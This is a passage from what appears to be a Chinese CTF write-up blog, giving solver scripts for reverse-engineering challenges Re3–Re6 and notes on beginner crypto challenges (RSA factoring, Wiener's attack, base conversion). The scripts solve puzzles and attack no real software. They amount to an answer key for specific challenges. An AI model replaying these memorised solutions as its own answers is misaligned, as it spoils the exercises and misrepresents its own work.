12。</p><hr><h3 id="Re3"><a href="#Re3" class="headerlink" title="Re3"></a>Re3</h3><p>生成了一个长度为29的cipher数组，输入flag后，比较是否是29位。后面是一个循环，将Flag[i]与19异或，若与cipher[i]相同，则正确。</p><hr><h3 id="Re4"><a href="#Re4" class="headerlink" title="Re4"></a>Re4</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">cipher = [</span><br><span class="line"><span class="number">80</span>,</span><br><span class="line"><span class="number">70</span>,</span><br><span class="line"><span class="number">94</span>,</span><br><span class="line"><span class="number">71</span>,</span><br><span class="line"><span class="number">80</span>,</span><br><span class="line"><span class="number">71</span>,</span><br><span class="line"><span class="number">85</span>,</span><br><span class="line"><span class="number">104</span>,</span><br><span class="line"><span class="number">86</span>,</span><br><span class="line"><span class="number">39</span>,</span><br><span class="line"><span class="number">64</span>,</span><br><span class="line"><span class="number">106</span>,</span><br><span class="line"><span class="number">76</span>,</span><br><span class="line"><span class="number">67</span>,</span><br><span class="line"><span class="number">106</span>,</span><br><span class="line"><span class="number">71</span>,</span><br><span class="line"><span class="number">123</span>,</span><br><span class="line"><span class="number">92</span>,</span><br><span class="line"><span class="number">125</span>,</span><br><span class="line"><span class="number">76</span>,</span><br><span class="line"><span class="number">37</span>,</span><br><span class="line"><span class="number">106</span>,</span><br><span class="line"><span class="number">103</span>,</span><br><span class="line"><span class="number">118</span>,</span><br><span class="line"><span class="number">80</span>,</span><br><span class="line"><span class="number">35</span>,</span><br><span class="line"><span class="number">119</span>,</span><br><span class="line"><span class="number">32</span>,</span><br><span class="line"><span class="number">110</span>,</span><br><span class="line">]</span><br><span class="line">flag =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(cipher[i]^<span class="number">19</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><hr><h3 id="Re4-1"><a href="#Re4-1" class="headerlink" title="Re4"></a>Re4</h3><p>IDA打开，发现是输入flag，经过加密，和结果比较。 eMl1_l1hT9_ldcoR3OC1CW0HhC_{UF30Tp__l}。</p><p>这结果就是flag的换位操作。输入一串字符串，并且再OD里查找到其换位的情况，就能反向推出Flag了。</p><p><img src="https://i.loli.net/2020/09/25/LOYIJwG93dQaA1H.jpg" alt="img"><br>    输入：ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-=</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">before = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-=&#x27;</span></span><br><span class="line">after = <span class="string">&#x27;VCKWTLRID1Z7S0YQJ8-XEOMU4A3HBG5PF2N96=&#x27;</span></span><br><span class="line">flag_encrpyt = <span class="string">&#x27;eMl1_l1hT9_ldcoR3OC1CW0HhC_&#123;UF30Tp__l&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(before)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(before)):</span><br><span class="line">        <span class="keyword">if</span> before[i] == after[j]:</span><br><span class="line">            flag += flag_encrpyt[j]</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><hr><h3 id="Re5"><a href="#Re5" class="headerlink" title="Re5"></a>Re5</h3><p>.NET文件，用dnspy打开，选择ACM阵营（太菜了TAT）。很快找到加密逻辑。</p><p>一开始用Z3列方程解，发现没法解，有模运算。</p><p>后来依据模的性质，直接将方程展开，组成矩阵求解。</p><p>根据hint去找了个带快速幂的脚本，用来解矩阵。</p><p>因为要输入好多次，修改下脚本，直接输入。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 110</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> r register</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">int</span> n,p,maxi;</span><br><span class="line">ll tmp,ans[maxn],a[maxn][maxn];</span><br><span class="line"><span class="keyword">int</span> key[<span class="number">41</span>] =&#123;</span><br><span class="line"><span class="number">233</span>,</span><br><span class="line"><span class="number">136</span>,</span><br><span class="line"><span class="number">189</span>,</span><br><span class="line"><span class="number">132</span>,</span><br><span class="line"><span class="number">157</span>,</span><br><span class="line"><span class="number">100</span>,</span><br><span class="line"><span class="number">196</span>,</span><br><span class="line"><span class="number">185</span>,</span><br><span class="line"><span class="number">138</span>,</span><br><span class="line"><span class="number">222</span>,</span><br><span class="line"><span class="number">90</span>,</span><br><span class="line"><span class="number">101</span>,</span><br><span class="line"><span class="number">115</span>,</span><br><span class="line"><span class="number">229</span>,</span><br><span class="line"><span class="number">161</span>,</span><br><span class="line"><span class="number">97</span>,</span><br><span class="line"><span class="number">135</span>,</span><br><span class="line"><span class="number">122</span>,</span><br><span class="line"><span class="number">127</span>,</span><br><span class="line"><span class="number">230</span>,</span><br><span class="line"><span class="number">143</span>,</span><br><span class="line"><span class="number">203</span>,</span><br><span class="line"><span class="number">137</span>,</span><br><span class="line"><span class="number">119</span>,</span><br><span class="line"><span class="number">80</span>,</span><br><span class="line"><span class="number">141</span>,</span><br><span class="line"><span class="number">227</span>,</span><br><span class="line"><span class="number">156</span>,</span><br><span class="line"><span class="number">178</span>,</span><br><span class="line"><span class="number">105</span>,</span><br><span class="line"><span class="number">133</span>,</span><br><span class="line"><span class="number">194</span>,</span><br><span class="line"><span class="number">184</span>,</span><br><span class="line"><span class="number">179</span>,</span><br><span class="line"><span class="number">159</span>,</span><br><span class="line"><span class="number">220</span>,</span><br><span class="line"><span class="number">111</span>,</span><br><span class="line"><span class="number">177</span>,</span><br><span class="line"><span class="number">145</span>,</span><br><span class="line"><span class="number">200</span>,</span><br><span class="line"><span class="number">181</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> sum[<span class="number">41</span>] = &#123;</span><br><span class="line"><span class="number">46384</span>,</span><br><span class="line"><span class="number">31562</span>,</span><br><span class="line"><span class="number">39797</span>,</span><br><span class="line"><span class="number">36757</span>,</span><br><span class="line"><span class="number">62393</span>,</span><br><span class="line"><span class="number">15780</span>,</span><br><span class="line"><span class="number">41763</span>,</span><br><span class="line"><span class="number">29976</span>,</span><br><span class="line"><span class="number">5998</span>,</span><br><span class="line"><span class="number">4308</span>,</span><br><span class="line"><span class="number">40650</span>,</span><br><span class="line"><span class="number">45891</span>,</span><br><span class="line"><span class="number">6897</span>,</span><br><span class="line"><span class="number">54534</span>,</span><br><span class="line"><span class="number">14623</span>,</span><br><span class="line"><span class="number">49558</span>,</span><br><span class="line"><span class="number">23530</span>,</span><br><span class="line"><span class="number">37973</span>,</span><br><span class="line"><span class="number">3560</span>,</span><br><span class="line"><span class="number">18854</span>,</span><br><span class="line"><span class="number">47021</span>,</span><br><span class="line"><span class="number">52794</span>,</span><br><span class="line"><span class="number">16283</span>,</span><br><span class="line"><span class="number">28942</span>,</span><br><span class="line"><span class="number">33213</span>,</span><br><span class="line"><span class="number">25540</span>,</span><br><span class="line"><span class="number">62337</span>,</span><br><span class="line"><span class="number">7253</span>,</span><br><span class="line"><span class="number">14550</span>,</span><br><span class="line"><span class="number">60109</span>,</span><br><span class="line"><span class="number">25945</span>,</span><br><span class="line"><span class="number">26838</span>,</span><br><span class="line"><span class="number">55988</span>,</span><br><span class="line"><span class="number">46800</span>,</span><br><span class="line"><span class="number">47119</span>,</span><br><span class="line"><span class="number">44280</span>,</span><br><span class="line"><span class="number">58951</span>,</span><br><span class="line"><span class="number">62100</span>,</span><br><span class="line"><span class="number">59760</span>,</span><br><span class="line"><span class="number">25395</span>,</span><br><span class="line"><span class="number">16590</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">r <span class="keyword">char</span> ch=getchar();r <span class="keyword">int</span> in=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(ch&gt;<span class="string">&#x27;9&#x27;</span>||ch&lt;<span class="string">&#x27;0&#x27;</span>) ch=getchar();</span><br><span class="line"><span class="keyword">while</span>(ch&gt;=<span class="string">&#x27;0&#x27;</span>&amp;&amp;ch&lt;=<span class="string">&#x27;9&#x27;</span>) in=(in&lt;&lt;<span class="number">3</span>)+(in&lt;&lt;<span class="number">1</span>)+ch-<span class="string">&#x27;0&#x27;</span>,ch=getchar();</span><br><span class="line"><span class="keyword">return</span> in;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ll <span class="title">ksm</span><span class="params">(r ll x,r <span class="keyword">int</span> y)</span><span class="comment">//快速幂算法 </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!y) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">r ll ret=ksm(x,y&gt;&gt;<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(y&amp;<span class="number">1</span>) <span class="keyword">return</span> ret*ret%p*x%p;</span><br><span class="line"><span class="keyword">return</span> ret*ret%p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//sum[0] = flag[i]*(k^(j-i)) ...... flag[41]*(k^(1))</span></span><br><span class="line"><span class="comment">//从1开始。 </span></span><br><span class="line"><span class="comment">/*n=read(),p=read();</span></span><br><span class="line"><span class="comment">for(r int i=1;i&lt;=n;i++)</span></span><br><span class="line"><span class="comment">for(r int j=1;j&lt;=n+1;j++)</span></span><br><span class="line"><span class="comment">a[i][j]=read();*/</span>     </span><br><span class="line"></span><br><span class="line">n = <span class="number">41</span> ;<span class="comment">//41个未知数 </span></span><br><span class="line">p = <span class="number">65537</span>;  <span class="comment">//p是取模 </span></span><br><span class="line"><span class="keyword">for</span>(r <span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)<span class="comment">//赋值a数组，其内容是k的幂，n从1开始，到41 </span></span><br><span class="line"><span class="keyword">for</span>(r <span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n;j++)<span class="comment">//i是行，j是列，也是从第一列开始到第41列 </span></span><br><span class="line">a[i][j]=ksm(key[i<span class="number">-1</span>],<span class="number">40</span>-j+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>;i&lt;=<span class="number">41</span>;i++)&#123;            <span class="comment">//对矩阵最后一列(第42列)进行sum赋值 </span></span><br><span class="line">a[i][<span class="number">42</span>]=sum[i<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(r <span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(!a[i][i])<span class="comment">//主元不能为0</span></span><br><span class="line">&#123;</span><br><span class="line">maxi=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(r <span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;=n&amp;&amp;!maxi;j++)</span><br><span class="line"><span class="keyword">if</span>(a[j][i]) maxi=j;</span><br><span class="line"><span class="keyword">if</span>(!maxi) <span class="keyword">continue</span>;<span class="comment">//如果一整列都为0，不需要消元</span></span><br><span class="line"><span class="keyword">for</span>(r <span class="keyword">int</span> j=i;j&lt;=n+<span class="number">1</span>;j++)</span><br><span class="line">tmp=a[maxi][j],a[maxi][j]=a[i][j],a[i][j]=tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(r <span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">&#123;</span><br><span class="line">tmp=a[j][i];</span><br><span class="line"><span class="keyword">if</span>(!tmp) <span class="keyword">continue</span>;<span class="comment">//已经为0，不需要消元</span></span><br><span class="line"><span class="keyword">for</span>(r <span class="keyword">int</span> k=i;k&lt;=n+<span class="number">1</span>;k++)</span><br><span class="line">a[j][k]=((a[j][k]*a[i][i]-a[i][k]*tmp)%p+p)%p;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(r <span class="keyword">int</span> i=n;i;i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(r <span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">a[i][n+<span class="number">1</span>]=((a[i][n+<span class="number">1</span>]-ans[j]*a[i][j])%p+p)%p;</span><br><span class="line">ans[i]=a[i][n+<span class="number">1</span>]*ksm(a[i][i],p<span class="number">-2</span>)%p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(r <span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++) <span class="built_in">printf</span>(<span class="string">&quot;%lld &quot;</span>,ans[i]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h3 id="Re6"><a href="#Re6" class="headerlink" title="Re6"></a>Re6</h3><p>先读懂七夕算法。这题给了加密后的Jpg图片，与加密用的脚本。逆出加密逻辑就行了。IDA打开exe文件。找到加密函数，因为太大，无法F5。直接看汇编。</p><p>进入encrypt()函数。</p><p>只能一步步跟了，大概分析出前几个逻辑之后。分析出规律，并且每次得到的新变量都会放进[ebp+var10]处，直接x跟踪这个变量，就能在上下文中快速得到剩下的加密逻辑。</p><p><img src="https://i.loli.net/2020/09/25/xX8Q7yrjTDWbqal.png" alt="image-20200925201311106"></p><p>最后总结得到总的加密逻辑，是七夕算法稍稍改变。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">a=(x&lt;&lt;<span class="number">12</span>h)^x</span><br><span class="line">b=(a&lt;&lt;<span class="number">1</span>Ch)^a</span><br><span class="line">c=(b&gt;&gt;<span class="number">2</span>h)^b</span><br><span class="line">d = (c&gt;&gt;<span class="number">9</span>)^c </span><br><span class="line">e = (d&gt;&gt;<span class="number">16</span>h)^d</span><br><span class="line">f = (e&lt;&lt;<span class="number">8</span>)^e</span><br><span class="line">g = (f&gt;&gt;<span class="number">12</span>h)^f </span><br><span class="line">h = (g&lt;&lt;<span class="number">1B</span>h)^g </span><br><span class="line">i = (h&lt;&lt;<span class="number">4</span>)^h </span><br><span class="line">j = (i&lt;&lt;<span class="number">12</span>h)^i</span><br><span class="line">k = (j&lt;&lt;<span class="number">10</span>h)^j</span><br><span class="line">l = (k&gt;&gt;<span class="number">0</span>Ah)^k</span><br><span class="line">m = (l&gt;&gt;<span class="number">0B</span>h)^l</span><br><span class="line">n = (m&gt;&gt;<span class="number">19</span>h)^m</span><br><span class="line">o = (n&gt;&gt;<span class="number">0F</span>h)^n</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在带佬的文件加密算法中修改一下就好了。</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> decrypt(<span class="keyword">unsigned</span> <span class="keyword">int</span> z)&#123;</span><br><span class="line">    <span class="comment">/*unsigned int y = leftShiftXor(c, 13);</span></span><br><span class="line"><span class="comment">    unsigned int x = rightShiftXor(y, 17);</span></span><br><span class="line"><span class="comment">    unsigned int p = leftShiftXor(x, 5);</span></span><br><span class="line"><span class="comment">    return p;*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> n = rightShiftXor(z,<span class="number">15</span>); </span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> m = rightShiftXor(n,<span class="number">25</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> l = rightShiftXor(m,<span class="number">11</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> k = rightShiftXor(l,<span class="number">10</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> j = leftShiftXor(k,<span class="number">16</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> i = leftShiftXor(j,<span class="number">18</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> h = leftShiftXor(i,<span class="number">4</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> g = leftShiftXor(h,<span class="number">27</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> f = rightShiftXor(g,<span class="number">18</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> e = leftShiftXor(f,<span class="number">8</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> d = rightShiftXor(e,<span class="number">22</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> c = rightShiftXor(d,<span class="number">9</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> b = rightShiftXor(c,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a = leftShiftXor(b,<span class="number">28</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> x = leftShiftXor(a,<span class="number">18</span>);</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><hr><h3 id="幼儿园的密码题"><a href="#幼儿园的密码题" class="headerlink" title="幼儿园的密码题"></a>幼儿园的密码题</h3><p>分解n</p><hr><h3 id="小学生的密码题"><a href="#小学生的密码题" class="headerlink" title="小学生的密码题"></a>小学生的密码题</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#c = [21,8841,841,884,21,884,42,888888821,8881,88888421,88888841,888421,88881,8888882,888841,888421,882,888881,8888421,88888,8888884,888888841]</span></span><br><span class="line">c =<span class="string">&quot;2108841084108840210884042088888882108881088888421088888841088842108888108888882088884108884210882088888108888421088888088888840888888841&quot;</span></span><br><span class="line">dic = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>), <span class="built_in">ord</span>(<span class="string">&quot;&#125;&quot;</span>) + <span class="number">1</span>)]</span><br><span class="line">flag = []</span><br><span class="line">print(<span class="built_in">len</span>(c))</span><br><span class="line">ans = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line"><span class="keyword">if</span>(c[i] != <span class="string">&#x27;0&#x27;</span>):</span><br><span class="line"><span class="keyword">if</span>(c[i] == <span class="string">&#x27;8&#x27;</span>):</span><br><span class="line">ans += <span class="number">8</span></span><br><span class="line"><span class="keyword">if</span>(c[i] == <span class="string">&#x27;4&#x27;</span>):</span><br><span class="line">ans += <span class="number">4</span></span><br><span class="line"><span class="keyword">if</span>(c[i] == <span class="string">&#x27;2&#x27;</span>):</span><br><span class="line">ans += <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span>(c[i] == <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">ans += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span>(c[i] == <span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">flag.append(ans)</span><br><span class="line">ans = <span class="number">0</span></span><br><span class="line">print(flag)</span><br><span class="line">x = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">x += dic[i-<span class="number">1</span>]</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure><hr><h3 id="初中生的密码题"><a href="#初中生的密码题" class="headerlink" title="初中生的密码题"></a>初中生的密码题</h3><p>构造z3方程解除p,q，取绝对值转成正数。</p><hr><h3 id="维也纳的秘密"><a href="#维也纳的秘密" class="headerlink" title="维也纳的秘密"></a>维也纳的秘密</h3><p>wiener’s attack</p><hr><h3 id="我只吃素"><a href="#我只吃素" class="headerlink" title="我只吃素"></a>我只吃素</h3><p>转为十六进制，再转字节流继续素数进制转换</p><p>36进制以下用pyhton自带int(a,n)模块，之后用进制表转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># with open(&#x27;10.txt&#x27;, &#x27;r&#x27;) as f:</span></span><br><span class="line"><span class="comment"># a=f.read()</span></span><br><span class="line"><span class="comment"># b=int(a,37)</span></span><br><span class="line"><span class="comment"># c = str(bytes.fromhex(hex(b)[2:]))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># with open(&#x27;11.txt&#x27;, &#x27;w&#x27;) as f:</span></span><br><span class="line"><span class="comment"># f.write(c)</span></span><br><span class="line"><span class="comment"># print(c)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a = 53774449144672072651983634999671257979028588739250085327427356842712128211693421006687459464296243751556246647104051338954036978334150758486798783752000076286724674301629980950557216155876376289491412124652632403402402370503151966644377052977831198024219894816336334348407952187642977780265673369611181007658284747634523818825633001988566552637112354696755</span></span><br><span class="line"><span class="comment"># b = str(bytes.fromhex(hex(a)[2:]))</span></span><br><span class="line"><span class="comment"># print(b)</span></span><br><span class="line"><span class="comment"># bb = 4ewx8C68op0f6pc51so1ABm9lgBce7n8mj2o3djj39pqg2m4zd5qessijlCEy2a6nEE68Azzkfyawf0k0a2k5p3fAndzwvq3zudewnxe9yviCjy1bf3vB0fzn4y7oDlmdzge0txueBf7C3que1n3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a = 5233728613606375657976979928056020574196863114188155716918309649738148318536854787122881232353110295371937978401912391749326699926603517862001910055203420511693337124690962705924804069703297414559735308881968136915280669320608716232802884</span></span><br><span class="line"><span class="comment"># b = str(bytes.fromhex(hex(a)[2:]))</span></span><br><span class="line"><span class="comment"># print(b)</span></span><br><span class="line"><span class="comment"># bb = 3prvE6r8jk8di37jGCfa4f2fCmb346lj4a51ymdqdk5hcCmGtB1th2l6zr2DGhgfv84Auq8kcckseCtq3e9vEsxdnkfg6aseGBD</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a = 43229137788244061542329848418700912953338168325804934916798790745654484584181753227393507557337247395185522499289482806852163725858927915419179194163003038581365</span></span><br><span class="line"><span class="comment"># b = str(bytes.fromhex(hex(a)[2:]))</span></span><br><span class="line"><span class="comment"># print(b)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a = 240601209018277235944025722380346889467221886496245930369392695432568925262249710088493177491025158020547047284</span></span><br><span 